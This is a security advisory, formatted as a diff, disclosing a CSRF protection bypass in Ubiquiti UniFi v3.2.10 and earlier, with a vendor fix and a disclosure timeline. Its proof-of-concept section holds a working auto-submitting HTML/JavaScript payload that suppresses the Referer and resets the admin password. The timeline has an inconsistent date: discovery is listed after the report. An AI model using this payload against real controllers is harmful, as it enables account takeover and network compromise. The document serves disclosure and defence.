@@ -1,0 +1,104 @@
+RCE Security Advisory
+https://www.rcesecurity.com
+ 
+ 
+1. ADVISORY INFORMATION
+-----------------------
+Product:        Ubiquiti Networks UniFi
+Vendor URL:     www.ubnt.com
+Type:           Cross-Site Request Forgery [CWE-353]
+Date found:     2015-03-19
+Date published: 2016-02-23
+CVSSv3 Score:   6.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L)
+CVE:            -
+ 
+ 
+2. CREDITS
+----------
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+ 
+ 
+3. VERSIONS AFFECTED
+--------------------
+UniFi v3.2.10
+older versions may be affected too.
+
+
+4. INTRODUCTION
+---------------
+The UniFi® Controller software is a powerful, enterprise wireless software 
+engine ideal for high-density client deployments requiring low latency and 
+high uptime performance. A single UniFi Controller running in the cloud 
+can manage multiple sites: multiple, distributed deployments and 
+multi-tenancy for managed service providers.
+
+(from the vendor's homepage)
+ 
+ 
+5. VULNERABILITY DESCRIPTION
+----------------------------
+A generic Cross-Site Request Forgery protection bypass vulnerability was
+identified in UniFi v3.2.10 and prior.
+ 
+The application uses a CSRF protection, which is based on verifying the
+Referer header, but does not catch the case where the Referer header
+is completely missing. 
+ 
+This leads to a generic CSRF protection bypass, resulting in all 
+application specific functionalities becoming vulnerable. An attacker needs 
+to trick the victim to visit an arbitrary website in order to exploit the 
+vulnerability. Successful exploits can allow the attacker to compromise the
+whole application including connected devices, e.g. by changing passwords
+of users, adding new users, changing device usernames and passwords or by 
+creating new WLAN configurations.
+ 
+ 
+6. PROOF-OF-CONCEPT
+-------------------
+The following PoC changes the password of the user "admin" to "csrfpwd":
+
+<html>
+<head>
+<script>
+function load() {
+    var postdata = '<form id=csrf method=POST enctype=\'text\/plain\' action=\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\'>' +
+                    '<input type=hidden name=\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40mail.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\' value=\'\' />' +
+                    '</form>';
+    top.frames[0].document.body.innerHTML=postdata;
+    top.frames[0].document.getElementById('csrf').submit();
+}
+</script>
+</head>
+<body onload="load()">
+<iframe src="about:blank" id="noreferer">< /iframe>
+</body>
+</html>
+ 
+ 
+7. SOLUTION
+-----------
+Upgrade to UniFi v4.7.5 or later
+ 
+ 
+8. REPORT TIMELINE
+------------------
+2015-03-19: Discovery of the vulnerability
+2015-03-10: Reported via Ubiquiti's Bug Bounty program (hackerone.com)
+2015-06-02: Vendor apologizes his backlog
+2015-09-28: Asking for status update via HackerOne 
+2015-09-28: Vendor asks to test against version 4.7.5
+2015-10-02: Verified working fix for v4.7.5
+2015-10-23: Vendor changes status to "Resolved"
+2015-11-24: Asking for coordinated disclosure via email
+2015-12-08: No response from vendor
+2015-12-08: Requested public disclosure on HackerOne
+2016-01-08: Report is published automatically
+2016-02-23: Advisory released
+ 
+ 
+9. REFERENCES
+-------------
+https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass
+https://hackerone.com/reports/52635
+
